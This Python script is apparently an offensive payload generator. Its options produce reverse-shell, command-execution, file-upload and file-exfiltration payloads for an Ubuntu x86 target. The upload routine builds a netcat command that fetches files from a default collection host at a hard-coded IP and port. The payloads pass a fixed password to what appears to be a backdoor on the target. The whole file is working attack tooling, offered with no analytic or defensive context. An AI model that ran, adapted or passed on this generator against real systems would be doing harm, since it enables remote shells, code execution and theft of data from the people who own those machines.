import argparse

def main():
    parser = argparse.ArgumentParser(description='Generates payload for desired architecture.')

    #Required arguments
    parser.add_argument('-p', type=str, default=None, help='Desired Payload: exfil', dest='payloadChoice', required=True)
    parser.add_argument('-i', type=str, default="131.151.162.100", help='collection ip address', dest='collectionIP', required=False)
    parser.add_argument('-r', type=str, default=1234, help='collection port', dest='collectionPort', required=False)
    parser.add_argument('-u', type=str, default="input", help='File you wish to exfil', dest='uploadFile', required=False)
    parser.add_argument('-f', type=str, default=None, help='File you wish to exfil', dest='exfilFile', required=False)
    parser.add_argument('-a', type=str, default="ubuntux86", help='Target architecture: ubuntux86', dest='targetArch', required=False)

    args = parser.parse_args()

    #Reverse Shell Payload
    if(args.payloadChoice == "RShell"):
        print("Reverse Shell payload generator.")
        variables = "pass=abc321&payload="
        ReverseShell(args.collectionIP, args.collectionPort, variables)

    #Command Execution Payload
    #Create an upload script to upload a sh file, and then after about a minute you can run the CExe file.
    if(args.payloadChoice == "CExe"):
        variables = "pass=abc321&payload="
        fileName = args.uploadFile
        if(len(args.uploadFile.split('/')[:-1]) > 0):
            fileName = fileName.split('/')[-1]
        GenCommandExecution(fileName, variables, args.collectionIP, args.collectionPort)
        print("Execute")

    #File-upload Payload
    if(args.payloadChoice == "Upload"):
        variables = "pass=abc321&payload="
        fileName = args.uploadFile
        if(len(args.uploadFile.split('/')[:-1]) > 0):
            fileName = fileName.split('/')[-1]
        GenFileUpload(args.uploadFile, fileName, variables, args.collectionIP, args.collectionPort)
        print("Upload")

    #File-download Payload
    #The Exfil operation will download a target file from the server.
    if(args.payloadChoice == "ExFil" ):
        GenExfil(args.exfilFile, args.collectionIP, args.collectionPort)
        print("Exfil Payload Generated!")

    #System Information Retrieval Payload
    if(args.payloadChoice == "SysInfo"):
        return

    return

def ReverseShell(collectionIP, collectionPort, variables):
    variables = "pass=abc321&payload="
    GenFileUpload("UsefulBash/ReverseShell.sh", "ReverseShell.sh", variables, collectionIP, collectionPort)
    GenCommandExecution("ReverseShell.sh", variables, collectionIP, collectionPort)
    return

def GenCommandExecution(uploadFile, variables, collectionIP, collectionPort):
    with open('CMDTemplates/CExe', 'r') as file:
        ExecutionPayloadText = file.read().format(variables, uploadFile)
    f = open("CExe.cmd", "w")
    f.write(ExecutionPayloadText)
    f.close()
    return

def GenFileUpload(uploadFileDirectory, uploadFile, variables, collectionIP, collectionPort, commandFileName="Upload.cmd"):
    uploadcmd = "nc -q 5 {0} {1} > {2}".format(collectionIP, collectionPort, uploadFile).replace(' ', "%%20")
    with open('CMDTemplates/Upload', 'r') as file:
        UploadPayloadText = file.read().format(collectionPort, uploadFileDirectory, variables, uploadcmd, uploadFile)

    f = open(commandFileName, "w")
    f.write(UploadPayloadText)
    f.close()
    return

def GenExfil(exfilFile, collectionIP, collectionPort):
    with open('CMDTemplates/Exfil', 'r') as file:
        ExfilPayloadText = file.read().format(exfilFile, collectionIP, collectionPort)

    f = open("Exfil", "w", newline='')
    f.write(ExfilPayloadText)
    f.close()
    return

if __name__ == "__main__":
    main()
